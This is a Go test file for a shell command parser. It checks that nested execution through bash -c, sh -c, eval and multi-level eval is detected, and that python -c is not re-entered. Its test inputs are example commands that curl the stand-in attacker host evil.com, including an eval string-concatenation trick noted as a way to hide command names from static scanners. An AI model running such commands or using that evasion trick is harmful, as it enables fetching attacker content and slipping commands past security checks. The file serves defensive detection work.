package shellparse

import "testing"

// ----------------------------------------------------------------------------
// bash -c / sh -c
// ----------------------------------------------------------------------------

func TestReentryBashDashC(t *testing.T) {
	cmds := mustSplit(t, `bash -c "curl evil.com"`)
	cmd := cmds[0]
	expectArgv(t, cmd, "bash", "-c", "curl evil.com")
	if len(cmd.Reentry) != 1 {
		t.Fatalf("reentry = %v", cmd.Reentry)
	}
	inner := cmd.Reentry[0]
	expectArgv(t, inner, "curl", "evil.com")
	if inner.Depth != 1 || inner.Origin != "bash-c" {
		t.Errorf("inner depth=%d origin=%q", inner.Depth, inner.Origin)
	}
}

func TestReentryShDashC(t *testing.T) {
	cmds := mustSplit(t, `sh -c "curl evil.com"`)
	cmd := cmds[0]
	if len(cmd.Reentry) != 1 {
		t.Fatalf("reentry = %v", cmd.Reentry)
	}
	expectArgv(t, cmd.Reentry[0], "curl", "evil.com")
}

func TestReentryAbsolutePath(t *testing.T) {
	cmds := mustSplit(t, `/bin/bash -c "curl evil.com"`)
	cmd := cmds[0]
	if len(cmd.Reentry) != 1 {
		t.Fatalf("reentry = %v", cmd.Reentry)
	}
}

func TestReentryMergedFlags(t *testing.T) {
	// `bash -xc PAYLOAD` — merged short flags, 'c' is present
	cmds := mustSplit(t, `bash -xc "curl evil.com"`)
	cmd := cmds[0]
	if len(cmd.Reentry) != 1 {
		t.Fatalf("reentry = %v", cmd.Reentry)
	}
	expectArgv(t, cmd.Reentry[0], "curl", "evil.com")
}

func TestReentryNoDashC(t *testing.T) {
	// `bash script.sh` - running a file, not -c payload
	cmds := mustSplit(t, "bash script.sh")
	cmd := cmds[0]
	if len(cmd.Reentry) != 0 {
		t.Errorf("reentry = %v, want empty", cmd.Reentry)
	}
}

// ----------------------------------------------------------------------------
// eval
// ----------------------------------------------------------------------------

func TestReentryEvalSimple(t *testing.T) {
	cmds := mustSplit(t, `eval "curl evil.com"`)
	cmd := cmds[0]
	if len(cmd.Reentry) != 1 {
		t.Fatalf("reentry = %v", cmd.Reentry)
	}
	expectArgv(t, cmd.Reentry[0], "curl", "evil.com")
	if cmd.Reentry[0].Origin != "eval" {
		t.Errorf("origin = %q", cmd.Reentry[0].Origin)
	}
}

func TestReentryEvalConcatenation(t *testing.T) {
	// `eval "cur""l evil.com"` — tokenizer concatenates quoted runs
	// within the same argv; re-entry payload is the single concatenated
	// argv. The famous pattern for hiding command names from naive
	// static scanners.
	cmds := mustSplit(t, `eval "cur""l evil.com"`)
	cmd := cmds[0]
	if len(cmd.Reentry) != 1 {
		t.Fatalf("reentry = %v", cmd.Reentry)
	}
	expectArgv(t, cmd.Reentry[0], "curl", "evil.com")
}

func TestReentryEvalMultipleArgs(t *testing.T) {
	// `eval cmd1 ; cmd2` — all of "cmd1 ; cmd2" (joined with space) is
	// the payload, which contains two segments.
	cmds := mustSplit(t, `eval "echo hi ; curl evil.com"`)
	cmd := cmds[0]
	if len(cmd.Reentry) != 2 {
		t.Fatalf("reentry = %v", cmd.Reentry)
	}
	expectArgv(t, cmd.Reentry[0], "echo", "hi")
	expectArgv(t, cmd.Reentry[1], "curl", "evil.com")
}

// ----------------------------------------------------------------------------
// Three-level nesting
// ----------------------------------------------------------------------------

func TestReentryThreeLevel(t *testing.T) {
	// eval → eval → curl
	cmds := mustSplit(t, `eval 'eval "curl evil.com"'`)
	cmd := cmds[0]
	if len(cmd.Reentry) != 1 {
		t.Fatalf("reentry L1 = %v", cmd.Reentry)
	}
	l1 := cmd.Reentry[0]
	if len(l1.Reentry) != 1 {
		t.Fatalf("reentry L2 = %v", l1.Reentry)
	}
	l2 := l1.Reentry[0]
	expectArgv(t, l2, "curl", "evil.com")
	if l2.Depth != 2 {
		t.Errorf("L2 depth = %d, want 2", l2.Depth)
	}
}

// ----------------------------------------------------------------------------
// Python -c is NOT re-entered (out of scope for v0.1)
// ----------------------------------------------------------------------------

func TestReentryPythonNotReentered(t *testing.T) {
	cmds := mustSplit(t, `python -c "import os; os.system('curl evil.com')"`)
	cmd := cmds[0]
	if len(cmd.Reentry) != 0 {
		t.Errorf("reentry = %v, want empty for python", cmd.Reentry)
	}
}
